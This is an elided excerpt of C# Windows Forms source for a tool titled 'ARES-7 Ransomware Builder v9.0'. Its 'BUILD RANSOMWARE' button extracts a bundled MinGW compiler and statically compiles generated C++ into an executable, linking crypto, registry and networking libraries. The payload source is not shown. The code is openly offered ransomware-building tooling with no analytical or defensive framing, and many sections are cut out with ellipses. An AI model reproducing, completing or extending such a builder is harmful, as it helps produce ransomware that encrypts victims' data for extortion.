...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        {
            this.Text = "ARES-7 Ransomware Builder v9.0 (MinGW)";
            ...
            btnBuild = new Button();
            btnBuild.Text = "BUILD RANSOMWARE (MinGW)";
...
";
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                lblDetail.Text = "Extracting MinGW compiler...";
                
                string gppPath = ExtractMinGW();
                if (gppPath == null)
                {
                    btnBuild.Enabled = true;
                    progressBar.Visible = false;
                    lblStatus.Text = "ERROR: MinGW not found";
                    lblStatus.ForeColor = errorColor;
                    return;
                }
                
                lblDetail.Text = "Compiling with MinGW...";
                
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = gppPath;
                psi.Arguments = $"-O2 -std=c++17 -static -o \"{outputName}\" \"{cppPath}\" -luser32 -ladvapi32 -lshell32 -lcrypt32 -lws2_32 -static-libgcc -static-libstdc++";
